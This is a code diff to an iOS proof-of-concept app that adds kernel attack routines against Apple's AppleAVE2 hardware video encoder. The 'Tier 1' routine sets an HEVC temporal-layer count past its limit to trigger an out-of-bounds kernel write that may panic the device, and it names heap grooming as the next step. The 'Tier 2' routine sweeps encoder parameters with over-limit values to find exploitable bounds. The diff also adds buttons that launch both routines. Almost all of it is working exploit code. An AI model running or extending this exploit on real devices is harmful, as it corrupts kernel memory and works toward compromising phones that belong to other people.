@@ -957,6 +957,240 @@ static void runAVE2PoC(void) {
 }
 
 // ============================================================
+// OOB Trigger Tests — PANIC CAPABLE
+// ============================================================
+
+static void oobOutputCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        FAIL(@"OOB encode callback error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer) {
+        PASS(@"Got encoded output after OOB trigger — survived!");
+    }
+}
+
+static void runTier1OOB(void) {
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════╗");
+    pocLog(@"║  TIER 1: Temporal Layer Off-by-One    ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***       ║");
+    pocLog(@"╚══════════════════════════════════════╝");
+    pocLog(@"");
+
+    INFO(@"Setting NumberOfTemporalLayers = 8 (patched limit: <7)");
+    INFO(@"This indexes array[7] in a size-7 kernel array → OOB by 1");
+    pocLog(@"");
+
+    VTCompressionSessionRef session = NULL;
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oobOutputCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        return;
+    }
+    PASS(@"HEVC session created (320x240, minimal)");
+
+    VTSessionSetProperty(session, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+    VTSessionSetProperty(session, CFSTR("AllowFrameReordering"), kCFBooleanTrue);
+
+    status = VTSessionSetProperty(session,
+        CFSTR("NumberOfTemporalLayers"), (__bridge CFTypeRef)@(8));
+    INFO(@"Set NumberOfTemporalLayers=8: %d (%s)",
+        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");
+
+    if (status != noErr) {
+        FAIL(@"Property rejected at set time");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    CFTypeRef readBack = NULL;
+    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"),
+        kCFAllocatorDefault, &readBack);
+    if (readBack) {
+        INFO(@"Readback: NumberOfTemporalLayers = %@", (__bridge id)readBack);
+        CFRelease(readBack);
+    }
+
+    INFO(@"PrepareToEncodeFrames...");
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    INFO(@"PrepareToEncode: %d", (int)status);
+
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed — kernel may have caught OOB at alloc");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    CVPixelBufferRef pb = NULL;
+    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+
+    if (status != noErr || !pb) {
+        FAIL(@"Pixel buffer creation failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return;
+    }
+
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (y) memset(y, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+        CVPixelBufferGetHeightOfPlane(pb, 0));
+    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uv) memset(uv, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+        CVPixelBufferGetHeightOfPlane(pb, 1));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+    pocLog(@"");
+    LOG(@"*** ENCODING FRAME WITH TEMPORAL_LAYERS=8 ***");
+    INFO(@"If device panics, check panic log for AppleAVE2");
+    pocLog(@"");
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d", (int)status);
+
+    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    INFO(@"CompleteFrames: %d", (int)status);
+
+    for (int i = 1; i <= 3; i++) {
+        CVPixelBufferLockBaseAddress(pb, 0);
+        y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, 0x40 + i * 0x20,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+        status = VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        INFO(@"Frame %d: %d", i, (int)status);
+    }
+
+    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    INFO(@"Final CompleteFrames: %d", (int)status);
+
+    CVPixelBufferRelease(pb);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    pocLog(@"");
+    PASS(@"=== Test complete without panic ===");
+    INFO(@"OOB write likely hit non-critical heap padding.");
+    INFO(@"Next: heap grooming to place controlled object adjacent.");
+}
+
+static void runTier2Probe(void) {
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════╗");
+    pocLog(@"║  TIER 2: VPS/SPS/PPS Bound Probing    ║");
+    pocLog(@"║  Safe — no encoding, just set/read     ║");
+    pocLog(@"╚══════════════════════════════════════╝");
+    pocLog(@"");
+
+    VTCompressionSessionRef session = NULL;
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        oobOutputCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        return;
+    }
+
+    // log2_max_minus4 (patched limit: <= 12)
+    LOG(@"=== log2_max_minus4 (limit: <=12) ===");
+    int logTests[] = {0, 4, 8, 12, 13, 16, 20, 28, 60};
+    for (int i = 0; i < 9; i++) {
+        status = VTSessionSetProperty(session,
+            CFSTR("log2_max_minus4"), (__bridge CFTypeRef)@(logTests[i]));
+        INFO(@"log2_max_minus4=%d: %s %s", logTests[i],
+            status == noErr ? "OK" : "REJECTED",
+            logTests[i] > 12 ? "*** OVER LIMIT ***" : "");
+    }
+
+    // VPS Alpha Layer ID (limit: < 63)
+    pocLog(@"");
+    LOG(@"=== VPS AlphaLayerID (limit: <63) ===");
+    int layerTests[] = {0, 32, 62, 63, 64, 100, 255};
+    for (int i = 0; i < 7; i++) {
+        status = VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            (__bridge CFTypeRef)@(layerTests[i]));
+        INFO(@"AlphaLayerID=%d: %s %s", layerTests[i],
+            status == noErr ? "OK" : "REJECTED",
+            layerTests[i] >= 63 ? "*** OVER LIMIT ***" : "");
+    }
+
+    // SPS Rep Format Index (limit: < 2)
+    pocLog(@"");
+    LOG(@"=== SPS RepFormatIndex (limit: <2) ===");
+    int repTests[] = {0, 1, 2, 3, 10, 50, 255};
+    for (int i = 0; i < 7; i++) {
+        status = VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+            (__bridge CFTypeRef)@(repTests[i]));
+        INFO(@"RepFormatIndex=%d: %s %s", repTests[i],
+            status == noErr ? "OK" : "REJECTED",
+            repTests[i] >= 2 ? "*** OVER LIMIT ***" : "");
+    }
+
+    // NumberOfSlices
+    pocLog(@"");
+    LOG(@"=== NumberOfSlices ===");
+    int sliceTests[] = {1, 4, 16, 64, 256, 257, 1000};
+    for (int i = 0; i < 7; i++) {
+        status = VTSessionSetProperty(session,
+            CFSTR("NumberOfSlices"), (__bridge CFTypeRef)@(sliceTests[i]));
+        INFO(@"NumberOfSlices=%d: %s", sliceTests[i],
+            status == noErr ? "OK" : "REJECTED");
+    }
+
+    // ChromaQPIndexOffsetMultiPPS (limit: <= 5)
+    pocLog(@"");
+    LOG(@"=== ChromaQPOffset (limit: <=5) ===");
+    int chromaTests[] = {0, 3, 5, 6, 10, 50, 255};
+    for (int i = 0; i < 7; i++) {
+        status = VTSessionSetProperty(session,
+            CFSTR("ChromaQPIndexOffsetMultiPPS"),
+            (__bridge CFTypeRef)@(chromaTests[i]));
+        INFO(@"ChromaQPOffset=%d: %s %s", chromaTests[i],
+            status == noErr ? "OK" : "REJECTED",
+            chromaTests[i] > 5 ? "*** OVER LIMIT ***" : "");
+    }
+
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    pocLog(@"");
+    INFO(@"Probing complete. Properties accepting over-limit values are exploitable.");
+}
+
+// ============================================================
 // App UI
 // ============================================================
 
@@ -968,8 +1202,10 @@ static void runAVE2PoC(void) {
 @property (strong) UITextView *logView;
 @property (strong) UIButton *chrootBtn;
 @property (strong) UIButton *ave2Btn;
-@property (strong) UIButton *bothBtn;
 @property (strong) UIButton *propDumpBtn;
+@property (strong) UIButton *tier2Btn;
+@property (strong) UIButton *tier1Btn;
+@property (strong) UIButton *bothBtn;
 @property (strong) UIButton *exportBtn;
 @end
 
@@ -1015,8 +1251,30 @@ static void runAVE2PoC(void) {
     [self.propDumpBtn addTarget:self action:@selector(runPropDump) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.propDumpBtn];
 
+    self.tier2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.tier2Btn.frame = CGRectMake(pad + btnW + gap, row2, btnW, btnH);
+    [self.tier2Btn setTitle:@"Tier 2 Probe" forState:UIControlStateNormal];
+    self.tier2Btn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
+    self.tier2Btn.layer.cornerRadius = 8;
+    [self.tier2Btn setTitleColor:UIColor.magentaColor forState:UIControlStateNormal];
+    [self.tier2Btn addTarget:self action:@selector(runTier2) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.tier2Btn];
+
+    CGFloat row3 = row2 + btnH + gap;
+
+    self.tier1Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.tier1Btn.frame = CGRectMake(pad, row3, btnW, btnH);
+    [self.tier1Btn setTitle:@"TIER 1 OOB" forState:UIControlStateNormal];
+    self.tier1Btn.backgroundColor = [UIColor colorWithRed:0.3 green:0.0 blue:0.0 alpha:1];
+    self.tier1Btn.layer.cornerRadius = 8;
+    self.tier1Btn.layer.borderWidth = 1;
+    self.tier1Btn.layer.borderColor = UIColor.redColor.CGColor;
+    [self.tier1Btn setTitleColor:UIColor.redColor forState:UIControlStateNormal];
+    [self.tier1Btn addTarget:self action:@selector(runTier1) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.tier1Btn];
+
     self.bothBtn = [UIButton buttonWithType:UIButtonTypeSystem];
-    self.bothBtn.frame = CGRectMake(pad + btnW + gap, row2, btnW, btnH);
+    self.bothBtn.frame = CGRectMake(pad + btnW + gap, row3, btnW, btnH);
     [self.bothBtn setTitle:@"Run Both" forState:UIControlStateNormal];
     self.bothBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
     self.bothBtn.layer.cornerRadius = 8;
@@ -1024,7 +1282,7 @@ static void runAVE2PoC(void) {
     [self.bothBtn addTarget:self action:@selector(runBoth) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.bothBtn];
 
-    CGFloat logTop = row2 + btnH + gap;
+    CGFloat logTop = row3 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -1057,6 +1315,18 @@ static void runAVE2PoC(void) {
 - (void)runPropDump {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runPropertyDump();
+    });
+}
+
+- (void)runTier1 {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runTier1OOB();
+    });
+}
+
+- (void)runTier2 {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runTier2Probe();
     });
 }
 
